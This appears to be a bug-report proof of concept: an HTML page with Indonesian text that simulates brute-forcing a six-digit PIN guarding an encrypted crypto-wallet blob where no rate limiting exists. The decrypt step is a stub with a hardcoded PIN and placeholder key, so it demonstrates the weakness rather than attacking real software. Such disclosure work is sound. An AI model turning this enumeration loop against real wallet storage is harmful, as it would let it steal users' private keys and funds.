<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PoC: Security Vulnerability Analysis</title>
</head>
<body>
    <h3>Laporan Bug: Kelemahan Enkripsi & Brute Force</h3>
    <button onclick="simulateAttack()">Jalankan Eksploitasi (Tanpa Rate Limiting)</button>
    <div id="log" style="margin-top:20px; font-family: monospace; background: #eee; padding: 10px;"></div>

    <script>
        // Simulasi data terenkripsi di Storage (Real-world scenario)
        let encryptedBlob = "U2FsdGVkX1+..."; // Data target
        let failedAttempts = 0;
        const MAX_ATTEMPTS = 5; // Proteksi yang seharusnya ada

        async function attemptDecrypt(pin) {
            // Dalam dApp nyata, ini memanggil Web Crypto API
            // Jika tidak ada Rate Limiting, penyerang memanggil ini ribuan kali
            return new Promise((resolve) => {
                setTimeout(() => {
                    // Simulasi logika gagal (kecuali PIN benar)
                    if (pin === "060403") resolve("0xPRIVATE_KEY_REAL");
                    else resolve(null);
                }, 10); // Kecepatan tinggi karena kurangnya delay/lockout
            });
        }

        async function simulateAttack() {
            const log = document.getElementById('log');
            log.innerHTML = "Memulai eksploitasi PIN 060403...<br>";

            for (let i = 0; i <= 999999; i++) {
                const pin = i.toString().padStart(6, '0');
                const result = await attemptDecrypt(pin);
                
                if (result) {
                    log.innerHTML += `✅ <b>SUKSES!</b> PIN ditemukan: ${pin}<br><b>Dampak:</b> Full Wallet Compromise.`;
                    return;
                }
                
                if (i % 1000 === 0) {
                    log.innerHTML = `Eksploitasi berjalan... sedang mencoba PIN: ${pin}`;
                }
            }
        }
    </script>
</body>
</html>
